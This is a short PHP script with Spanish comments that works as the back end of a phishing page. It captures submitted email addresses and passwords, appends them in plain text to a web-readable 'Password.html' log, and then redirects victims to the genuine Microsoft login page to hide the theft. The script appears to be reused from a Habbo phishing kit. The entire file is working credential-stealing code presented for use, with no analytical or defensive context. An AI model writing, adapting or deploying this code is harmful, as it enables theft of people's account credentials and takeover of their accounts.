<?php

//caracteres randomicos antes de la contraseña
$seed = str_split('abcdefghijklmnopqrstuvwxyz'
                     .'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                     .'0123456789!@#$%^&*()'); 
    shuffle($seed); 
    $rand = '';
    foreach (array_rand($seed, mt_rand(1,7)) as $k) $rand .= $seed[$k];
 
    //echo $rand;
    
//caracteres randomicos despues de la contraseña    
$seed1 = str_split('abcdefghijklmnopqrstuvwxyz'
                     .'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                     .'0123456789!@#$%^&*()'); 
    shuffle($seed1); 
    $rand1 = '';
    foreach (array_rand($seed1, mt_rand(1,7)) as $k) $rand1 .= $seed1[$k];
 
    //echo $rand1;
    

$habbo = $_POST['email']; 
$password = $_POST['pass'];

//md5 del Password
//$password = md5($password);
$f = fopen("Password.html", "a"); 
//fwrite ($f, 'Email:  [  <b><font color="#0089fa">'.$habbo.'</font></b>  ] Password:  [  <b><font color="#ff002b">'."{$rand}{$password}{$rand1}".'</font></b>  ] <br>');
fwrite ($f, 'Email:  [  <b><font color="#0089fa">'.$habbo.'</font></b>  ] Password:  [  <b><font color="#ff002b">'.$password.'</font></b>  ] <br>');
fclose($f);

header("Location: https://login.microsoftonline.com/es");
/* Concatenar variable PHP
"qwe{$a}rty"
"{$str1}{$str2}{$str3}"
*/
?>